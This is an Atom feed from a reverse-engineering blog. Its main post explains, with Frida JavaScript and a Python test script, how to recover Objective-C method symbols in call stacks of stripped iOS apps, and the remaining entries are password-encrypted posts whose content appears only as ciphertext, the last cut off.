<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>4ch12dy</title>
  
  <subtitle>当梦想全都被take away</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/"/>
  <updated>2019-07-02T13:04:25.994Z</updated>
  <id>https://github.com/4ch12dy/4ch12dy.github.io.git/</id>
  
  <author>
    <name>4ch12dy</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Frida调用栈符号恢复</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/02/xia0CallStackSymbols/xia0CallStackSymbols/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/02/xia0CallStackSymbols/xia0CallStackSymbols/</id>
    <published>2019-07-02T09:00:14.000Z</published>
    <updated>2019-07-02T13:04:25.994Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Frida调用栈符号恢复"><a href="#Frida调用栈符号恢复" class="headerlink" title="Frida调用栈符号恢复"></a>Frida调用栈符号恢复</h3><h4 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h4><p>搞了一阵子的Android方向的逆向研究，发现用frida去做一些hook等测试十分方便。最近自己想在iOS平台实现短视频下载去水印的问题，所以也想用frida来试试。但是测试过程中当我想去看下hook点的调用栈的时候，发现只有一些栈地址，基本没有符号信息，估计符号表被strip了。这里通常的做法就是用这些地址减去偏移然后去ida里面找到对应的方法。这样无疑是大大增加了分析的时间，想到之前解决<a href="[http://4ch12dy.site/2018/10/03/LLDB%E8%B0%83%E8%AF%95%E5%99%A8%E6%A0%88%E7%AC%A6%E5%8F%B7%E5%8C%96/%E5%BC%BA%E5%8C%96%E4%BD%A0%E7%9A%84lldb%E8%B0%83%E8%AF%95%E5%99%A8/](http://4ch12dy.site/2018/10/03/LLDB调试器栈符号化/强化你的lldb调试器/">lldb调试器栈符号恢复</a>)方案，决定把lldb的栈符号恢复脚本移植到frida中。</p><h4 id="如何恢复已经去掉符号表的可执行文件？"><a href="#如何恢复已经去掉符号表的可执行文件？" class="headerlink" title="如何恢复已经去掉符号表的可执行文件？"></a>如何恢复已经去掉符号表的可执行文件？</h4><p>这里的符号恢复仅仅针对的是OC函数，C函数如果符号表被strip以后是没有办法恢复其符号信息的。为什么OC函数可以去做符号恢复呢？这里要涉及到macho文件的格式以及ObjectC这个语言自身设计相关。可以看到在macho文件中的_DATA数据段中有很多objc的节信息，里面保存了所有的类以及方法等元数据信息。既然如此，我们肯定能找到方法去恢复这些OC函数的符号。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/xia0CallStackSymbols/image-20190702172303432.png?raw=true" alt="image-20190702172303432"></p><h4 id="OC函数符号恢复思路"><a href="#OC函数符号恢复思路" class="headerlink" title="OC函数符号恢复思路"></a>OC函数符号恢复思路</h4><p>首先我们只能得到一堆调用链的地址，这些地址肯定是函数里面的某个偏移地址。很容易想到这个地址往前推肯定就是这个函数的首地址及函数地址。如果我们拿到了所有函数的地址，然后每一个地址和目标地址比较，与目标地址距离最近的那个地址所对应的函数不就是我们想要的符号吗。</p><p>根据上面提到的思路，目前需要解决几个问题，怎么拿到所有OC方法的地址? 以及对应的类名和方法名?如何设计匹配算法等？</p><p>这里有两种办法：</p><ul><li>第一种是自己去解析在内存中加载的macho文件，根据macho的文件格式先找到class信息，然后找到对应的method信息，method里面就保存了IMP和方法名。之前我尝试这样去过，所有的信息都能拿到，但是由于在macho在加载到内存的时候objc动态库会做很多的初始化等工作，导致要处理一些细节问题，所以就没继续做了。</li><li>第二种是利用已有的objc提供的接口objc_去拿到所有的class以及对应method的方法名和IMP。这里主要用的的API有<code>objc_copyClassNamesForImage</code>、<code>class_copyMethodList</code> 、<code>objc_getClass</code>、<code>method_getImplementation</code>、<code>method_getName</code>、<code>objc_getClass</code>、<code>objc_getMetaClass</code></li></ul><p>现在已经能拿到所有的类方法、方法名、方法实现地址了，接下来要解决的就是怎么通过调用栈的地址去找到对应的方法，这里的思路就是遍历所有的方法地址与调用栈的地址比较并计算距离，如果方法地址小于目标地址且距离最小，那么该方法就是我们要找到的符号。最后将调用栈上面的所有地址都进行该操作即可。</p><h4 id="frida的js环境编写代码"><a href="#frida的js环境编写代码" class="headerlink" title="frida的js环境编写代码"></a>frida的js环境编写代码</h4><p>由于我之前在lldb的python脚本中写过该过程代码(<del>lldb内置的OC解释器语法要求十分严格，调试了很久的代码</del>)</p><p>按照上面的思路理论上代码很好写，也不是很复杂。如果是直接写OC代码应该很好写，但是在frida中写这些还是挺折腾的。</p><p>主要的代码如下：</p><p>根据模块路径获取其所有的类</p><pre><code class="js">function getAllClass(modulePath){    // const char * objc_copyClassNamesForImage(const char *image, unsigned int *outCount)    var objc_copyClassNamesForImage = new NativeFunction(        Module.findExportByName(null, &#39;objc_copyClassNamesForImage&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;, &#39;pointer&#39;]    );    // free    var free = new NativeFunction(Module.findExportByName(null, &#39;free&#39;), &#39;void&#39;, [&#39;pointer&#39;]);    // if given modulePath nil, default is mainBundle    if(!modulePath){        var path = ObjC.classes.NSBundle.mainBundle().executablePath().UTF8String();    }else{        var path = modulePath;    }    // create args    var pPath = Memory.allocUtf8String(path);    var p = Memory.alloc(Process.pointerSize);    Memory.writeUInt(p, 0);    var pClasses = objc_copyClassNamesForImage(pPath, p);    var count = Memory.readUInt(p);    var classes = new Array(count);    for (var i = 0; i &lt; count; i++) {        var pClassName = Memory.readPointer(pClasses.add(i * Process.pointerSize));        classes[i] = Memory.readUtf8String(pClassName);    }    free(pClasses);    // XLOG(classes)    return classes;}</code></pre><p>根据类名获取所有的方法信息，由于有实例方法和类方法，这里需要分别获取。</p><pre><code class="js">function getAllMethods(classname){    var objc_getClass = new NativeFunction(        Module.findExportByName(null, &#39;objc_getClass&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;]    );    var class_copyMethodList = new NativeFunction(        Module.findExportByName(null, &#39;class_copyMethodList&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;, &#39;pointer&#39;]    );    var objc_getMetaClass = new NativeFunction(        Module.findExportByName(null, &#39;objc_getMetaClass&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;]    );    var method_getName = new NativeFunction(        Module.findExportByName(null, &#39;method_getName&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;]    );    var free = new NativeFunction(Module.findExportByName(null, &#39;free&#39;), &#39;void&#39;, [&#39;pointer&#39;]);    // get objclass and metaclass    var name = Memory.allocUtf8String(classname);    var objClass = objc_getClass(name)    var metaClass = objc_getMetaClass(name)    // get obj class all methods    var size_ptr = Memory.alloc(Process.pointerSize);    Memory.writeUInt(size_ptr, 0);    var pObjMethods = class_copyMethodList(objClass, size_ptr);    var count = Memory.readUInt(size_ptr);    var allMethods = new Array();    var allObjMethods = new Array();    // get obj class all methods name and IMP    for (var i = 0; i &lt; count; i++) {        var curObjMethod = new Array();        var pObjMethodSEL = method_getName(pObjMethods.add(i * Process.pointerSize))        var pObjMethodName = Memory.readCString(Memory.readPointer(pObjMethodSEL))        var objMethodIMP = Memory.readPointer(pObjMethodSEL.add(2*Process.pointerSize))        // XLOG(&quot;-[&quot;+classname+ &quot; &quot; + pObjMethodName+&quot;]&quot; + &quot;:&quot; + objMethodIMP)        curObjMethod.push(pObjMethodName)        curObjMethod.push(objMethodIMP)        allObjMethods.push(curObjMethod)    }    var allMetaMethods = new Array();    // get meta class all methods name and IMP    var pMetaMethods = class_copyMethodList(metaClass, size_ptr);    var count = Memory.readUInt(size_ptr);    for (var i = 0; i &lt; count; i++) {        var curMetaMethod = new Array();        var pMetaMethodSEL = method_getName(pMetaMethods.add(i * Process.pointerSize))        var pMetaMethodName = Memory.readCString(Memory.readPointer(pMetaMethodSEL))        var metaMethodIMP = Memory.readPointer(pMetaMethodSEL.add(2*Process.pointerSize))        //XLOG(&quot;+[&quot;+classname+ &quot; &quot; + pMetaMethodName+&quot;]&quot; + &quot;:&quot; + metaMethodIMP)        curMetaMethod.push(pMetaMethodName)        curMetaMethod.push(metaMethodIMP)        allMetaMethods.push(curMetaMethod)    }    allMethods.push(allObjMethods)    allMethods.push(allMetaMethods)    free(pObjMethods);    free(pMetaMethods);    return allMethods;}</code></pre><p>通过调用栈地址根据最近匹配的算法去找到对应的符号信息</p><pre><code class="js">function findSymbolFromAddress(modulePath,addr){    var frameAddr = addr    var theDis = 0xffffffffffffffff;    var tmpDis = 0;    var theClass = &quot;None&quot;    var theMethodName = &quot;None&quot;    var theMethodType = &quot;-&quot;    var theMethodIMP = 0    var allClassInfo = {}    var allClass = getAllClass(modulePath);    for(var i = 0, len = allClass.length; i &lt; len; i++){        var mInfo = getAllMethods(allClass[i]);        var curClassName = allClass[i]        objms = mInfo[0];        for(var j = 0, olen = objms.length; j &lt; olen; j++){            mname = objms[j][0]            mIMP = objms[j][1]            if(frameAddr &gt;= mIMP){                tmpDis = frameAddr-mIMP                if(tmpDis &lt; theDis){                    theDis = tmpDis                    theClass = curClassName                    theMethodName = mname                    theMethodIMP = mIMP                    theMethodType = &quot;-&quot;                }            }        }        metams = mInfo[1];        for(var k = 0, mlen = metams.length; k &lt; mlen; k++){            mname = metams[k][0]            mIMP = metams[k][1]            if(frameAddr &gt;= mIMP){                tmpDis = frameAddr-mIMP                if(tmpDis &lt; theDis){                    theDis = tmpDis                    theClass = curClassName                    theMethodName = mname                    theMethodIMP = mIMP                    theMethodType = &quot;+&quot;                }            }        }    }    symbol = theMethodType+&quot;[&quot;+theClass+&quot; &quot;+theMethodName+&quot;]&quot;    if(symbol.indexOf(&quot;.cxx&quot;)!=-1){        symbol = &quot;maybe C function?&quot;    }    // if distance &gt; 3000, maybe a c function    if(theDis &gt; 3000){        symbol = &quot;maybe C function? symbol:&quot; + symbol    }    return symbol;}</code></pre><p>在匹配算法的最后还进行了一些判断，当解析出来的方法名包含<code>.cxx</code>方法的时候说明没找到符号，可能是一个C函数。当解析出来的方法地址距离目标地址距离大于3000的时候会提示可能会C函数。</p><p>最后完整的项目地址：<a href="https://github.com/4ch12dy/xia0FridaScript">https://github.com/4ch12dy/xia0FridaScript</a></p><h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><p>我这里写了一个简单的frida脚本去测试如何导入符号恢复的js脚本</p><pre><code class="python">#!/usr/bin/pythonimport fridaimport sys import codecsimport osPACKAGE_NAME = &quot;cn.xiaobu.pipiPlay&quot;def on_message(message, data):    try:        if message:            print(&quot;[JSBACH] {0}&quot;.format(message[&quot;payload&quot;]))    except Exception as e:        print(message)        print(e)def xia0CallStackSymbolsTest():    script_dir = os.path.dirname(os.path.realpath(__file__))    xia0CallStackSymbolsJS = os.path.join(script_dir, &#39;xia0CallStackSymbols.js&#39;)    source = &#39;&#39;    with codecs.open(xia0CallStackSymbolsJS, &#39;r&#39;, &#39;utf-8&#39;) as f:        source = source + f.read()    js = &#39;&#39;&#39;    if (ObjC.available)    {            try            {                    //Your class name here  - ZYOperationView operationCopyLink                    var className = &quot;ZYMediaDownloadHelper&quot;;                    //Your function name here                    var funcName = &quot;+ downloadMediaUrl:isVideo:progress:finishBlock:&quot;;                    var hook = eval(&#39;ObjC.classes.&#39; + className + &#39;[&quot;&#39; + funcName + &#39;&quot;]&#39;);                    Interceptor.attach(hook.implementation, {                        onEnter: function(args) {                            // args[0] is self                            // args[1] is selector (SEL &quot;sendMessageWithText:&quot;)                            // args[2] holds the first function argument, an NSString                            console.log(&quot;[*] Detected call to: &quot; + className + &quot; -&gt; &quot; + funcName);                            // just call [NSThread callStackSymbols]                            var threadClass = ObjC.classes.NSThread                            var symbols = threadClass[&quot;+ callStackSymbols&quot;]()                            console.log(symbols)                            // call  xia0CallStackSymbols [true:just symbolish mainModule address false:symbolish all module address]                            xia0CallStackSymbols(true);                            xia0CallStackSymbols(false);                        }                    });            }            catch(err)            {                    console.log(&quot;[!] Exception2: &quot; + err.message);            }    }    else    {            console.log(&quot;Objective-C Runtime is not available!&quot;);    }    &#39;&#39;&#39;    return source+jsdef do_hook():    return xia0CallStackSymbolsTest()if __name__ == &#39;__main__&#39;:    try:        device = frida.get_device_manager().enumerate_devices()[-1]        print device        pid = device.spawn([PACKAGE_NAME])        print(&quot;[JSBACH] {} is starting. (pid : {})&quot;.format(PACKAGE_NAME, pid))        session = device.attach(pid)        device.resume(pid)        script = session.create_script(do_hook())        script.on(&#39;message&#39;, on_message)        script.load()        sys.stdin.read()    except KeyboardInterrupt:        sys.exit(0)</code></pre><p>只需要将<code>xia0CallStackSymbols.js</code>脚本放到项目中，然后用以下代码即可导入使用</p><pre><code class="python">script_dir = os.path.dirname(os.path.realpath(__file__))xia0CallStackSymbolsJS = os.path.join(script_dir, &#39;xia0CallStackSymbols.js&#39;)source = &#39;&#39;with codecs.open(xia0CallStackSymbolsJS, &#39;r&#39;, &#39;utf-8&#39;) as f:    source = source + f.read()your_frida_js_hook_script = &quot;&quot;load_js = your_frida_js_hook_script+source</code></pre><p>恢复的效果如下：</p><ul><li><p>通过<code>[NSThread callStackSymbols]</code>获取的调用栈符号</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/xia0CallStackSymbols/image-20190702181519237.png?raw=true" alt="image-20190702181519237"></p></li><li><p>通过调用<code>xia0CallStackSymbols</code>函数获取的调用栈符号</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/xia0CallStackSymbols/image-20190702181145710.png?raw=true" alt="image-20190702181145710"></p></li><li><p>作为比较，我在放上lldb中恢复调用栈</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/xia0CallStackSymbols/image-20190702181638614.png?raw=true" alt="image-20190702181638614"></p></li></ul><p>这里可以看出lldb调试器恢复的符号信息最完整且准确，lldb的栈符号恢复项目在<a href="https://github.com/4ch12dy/xia0LLDB">这里</a>，现在还能支持block函数的符号恢复。</p><p>这里有几个问题需要说明一下：</p><ul><li><p>xia0CallStackSymbols的符号为什么前15个地址没有显示？</p><p>因为前15个地址都是frida中js解释器里面的函数执行地址，没有办法拿到模块信息，也没必要解析这些地址。</p></li><li><p>xia0CallStackSymbols中还提供了内存对应的文件地址，如果你觉得符号有问题，可以直接去ida中手动查找符号</p></li><li><p>如果用dladdr能够拿到地址的符号信息，就没有调用xia0CallStackSymbols去恢复(比如符号表没有strip的情况)</p></li><li><p>xia0CallStackSymbols()接口可以传递一个bool参数，true为仅仅解析主模块的地址，false为所有模块都需要解析。实际在逆向过程中一般只需要主模块的符号信息，其他系统函数没很大必要。</p></li></ul><h4 id="遗留问题-Todo"><a href="#遗留问题-Todo" class="headerlink" title="遗留问题/Todo"></a>遗留问题/Todo</h4><ul><li>在执行恢复符号的过程中时间相对较长，主要原因在于每一个地址都要和所有方法比较，这里建议xia0CallStackSymbols传入true，这样只解析主模块的地址。耗时的原因还在于每一个地址解析的时候都会去调用接口获取所有方法信息，实际上每个模块只需要一次就能拿到所有方法信息，接下来要做的就是优化相关代码，缓存模块的所有方法信息，下次解析的地址为该模块时直接去缓存里面匹配查找。</li><li>在匹配符号的过程中，判断是否为C函数需要更多的原则，3000的阈值需要后面再调下。</li><li>关于block的符号恢复，目前只有在lldb中实现了，下一步准备在xia0CallStackSymbols中也支持恢复block函数符号</li></ul><h4 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h4><p>短视频下载去水印如果有人感兴趣的话，可以点<a href="https://github.com/4ch12dy/fkwatermark">这里</a>，目前支持的有皮皮搞笑、抖音（我不看抖音！）</p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><a href="https://github.com/poxyran/misc">https://github.com/poxyran/misc</a></li><li>&lt; <a href="https://github.com/iddoeldor/frida-snippets">https://github.com/iddoeldor/frida-snippets</a> &gt;</li><li><a href="http://www.blogfshare.com/ioss-validate-address.html" target="_blank" rel="external">http://www.blogfshare.com/ioss-validate-address.html</a></li><li><a href="https://jmpews.github.io/2017/08/09/darwin/反注入及绕过/" target="_blank" rel="external">https://jmpews.github.io/2017/08/09/darwin/%E5%8F%8D%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/</a></li><li><a href="https://github.com/interference-security/frida-scripts">https://github.com/interference-security/frida-scripts</a></li><li><a href="https://github.com/dweinstein/awesome-frida">https://github.com/dweinstein/awesome-frida</a></li><li><a href="https://www.frida.re/docs/javascript-api/" target="_blank" rel="external">https://www.frida.re/docs/javascript-api/</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Frida调用栈符号恢复&quot;&gt;&lt;a href=&quot;#Frida调用栈符号恢复&quot; class=&quot;headerlink&quot; title=&quot;Frida调用栈符号恢复&quot;&gt;&lt;/a&gt;Frida调用栈符号恢复&lt;/h3&gt;&lt;h4 id=&quot;开始&quot;&gt;&lt;a href=&quot;#开始&quot; class=&quot;
      
    
    </summary>
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/re/"/>
    
    
      <category term="frida" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/frida/"/>
    
      <category term="iosre" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/iosre/"/>
    
  </entry>
  
  <entry>
    <title>andoid调试深度总结</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/06/04/andoid%E8%B0%83%E8%AF%95%E6%B7%B1%E5%BA%A6%E6%80%BB%E7%BB%93/andoid%E8%B0%83%E8%AF%95%E6%B7%B1%E5%BA%A6%E6%80%BB%E7%BB%93/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/06/04/andoid调试深度总结/andoid调试深度总结/</id>
    <published>2019-06-04T14:54:21.000Z</published>
    <updated>2019-06-05T06:57:29.464Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Android Auto.js脚本加密分析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/25/autojs%E5%8A%A0%E5%AF%86%E5%88%86%E6%9E%90/autojs%E5%8A%A0%E5%AF%86%E5%88%86%E6%9E%90/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/25/autojs加密分析/autojs加密分析/</id>
    <published>2019-04-25T07:12:09.000Z</published>
    <updated>2019-04-30T02:52:18.678Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="show me the code" />    <label for="pass">show me the code</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/re/"/>
    
    
      <category term="android" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/android/"/>
    
      <category term="auto.js" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/auto-js/"/>
    
  </entry>
  
  <entry>
    <title>再谈arm指令编码</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/15/arm-instruction-encode/arm-instruction-encode/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/15/arm-instruction-encode/arm-instruction-encode/</id>
    <published>2019-04-15T06:42:12.000Z</published>
    <updated>2019-04-29T11:59:18.079Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="note" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/note/"/>
    
    
      <category term="arm" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/arm/"/>
    
  </entry>
  
  <entry>
    <title>符号执行解决代码混淆实践</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/15/antiOLLVM/antiOLLVM/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/15/antiOLLVM/antiOLLVM/</id>
    <published>2019-04-15T06:42:12.000Z</published>
    <updated>2019-05-17T08:47:41.244Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">U2FsdGVkX19fw44aqR8/9wD/2MgrxxfkuR0uog0+dm+e8TVw4xQXQcha/MSnA8s/pd+Pa/ZwWZOZQ8I12bfFJSFNIwsr2kEeeUTzIjdGq9faXNQYUG2I+gDOz2sz1nR+rJvA2AG5cXiv1jRWTyLN+QGH61jc3xm/EXLFGgequbj6n07XNXzG02iRwQNOaj9XYYYwGcn8rCOtev/y4jTLMq68pCJ0vBq+IwJHn1tjhOE/VIDyxcl7+RdLlk0pUrzVRRrhrNWuGc6EMvzDIZvuyscj9UKvryUEQXQagfbQZcOOxXN6aJqSZSkklyWTLeuEQ9nJISf5IbggM42d/Z/ZM196F4UZ5mcislsLglr8OyyiHPb9PEq/lrxFoS4bl3r0xeXpXMSwq4A9pEPKSh575J94TxPUR5TclCJQ5t7SXt2FHKohCXrqVZD1OYpjoDaLgPAcbQlG8o41dP1o1APbjg7lLmtQ97c+ikVXUugl5dOZ1IvFXgUfy5j359IoKxv9rH6nTyzROFmfOaRWk0ZWD9aQDBabHh81kLvN7rBo7UmcXVXcAPnENdBeOuvGs7VfrQ8DeCUfyPz8RKxsC29fbezmU0Fx1R+YK2x4W9eSDvlUb+Fzha26C/pmn43tCoGB7q3LV61tGjUtan2yM7LzTC80EJ1dM2R4kbqY0FUxMsyhCdAfoAY5EHUsJojRneUqJIPRnqVeLBcbkbHM2oziVqVaQa4IiQ/5fi//B5vkLzCTM8qciHfTqF3Z86L5gg2cI9ZqtSAU9vzzWHezye+55m4DOp7p6xtXLmPL0QnogdEkX8ZtDHkUe25MqWmNq0BJTSCGAclUsMI4Jz9QUyfaKA3K/fA/Xw1L0S9oIFMsLcWJlegTOhpGAkjt4ThQjMB9d17zuWtypytwf3jOnE7uKeaE+EYLI8y4HLSPv6+CoNQxsYCpq8sHzFyhUCPQxAcyiyqa+ebkfOho0XuE9app/+IkDoTNdxYCIN5nHI+Pa2wpZXSlbXPgrgnht1ru5fU9XM6fsXHR7200MIruDkPpvlfiq6IckfXI90KnIMmEu9lknaFrltKJowYbQ+pLrFHmkyr9SeYegwhDkgZKCO0Zjxw5YA/T7UWkUuhwQrribQv2bpxlSHPgHBMOEYr1StIfLyDTmrsKZRx1kaY1iQEEs8emgb10wWA0sJEXvIo6cJBf3Foh7afKDqjf4VVnflRc3E2d9qIqADQWROHBVDaaOp/c+SSjUuxqqjr6Em4bVDxB2Y7WO8JfPzO+0Xe8WolaH0Glrd00blhl8cHPThQMwPhQajbCvDr3iu7wJak9UPW/nSFlVCTzCPeKdnL6MxYHmuwyfQRnytJkdtjDTLb5z35bSQDvXE8o7f/rURV+ayFsjxm2IvyhAMj0LhXyPZzhgGzCrRWHzjIGuDLFlOjHRafaNCiylKyz4pfUxH+iUqYy9b/JFEkCsEQwjVRhZx7ld8dKaG71oMd8vKIdVi72TD8Rfh/2Fup/A0zBpY/IffFkHUBAnZLtAUO/8z8